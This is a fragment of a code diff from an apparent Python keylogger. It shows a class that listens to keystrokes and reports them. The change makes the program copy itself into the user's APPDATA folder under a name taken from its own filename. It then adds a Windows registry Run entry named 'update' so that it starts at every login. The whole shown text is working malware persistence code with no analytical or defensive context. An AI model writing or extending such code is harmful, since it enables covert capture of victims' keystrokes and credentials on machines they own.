@@ -81,8 +81,12 @@ class capture_words:
         with keyboard_listener:
             self.report()
             keyboard_listener.join()
+filename=os.path.basename(sys.argv[0])
+filename=str(filename)
+filename=filename.split(".")
+filename=str(filename[0])+".exe"
 try:
-    e_f_loc=os.environ["appdata"]+"\\Windows Explorer.exe"
+    e_f_loc=os.environ["appdata"]+"\\"+filename
     if not os.path.exists(e_f_loc):
         shutil.copyfile(sys.executable,e_f_loc)
         subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+e_f_loc+'"',shell=True)
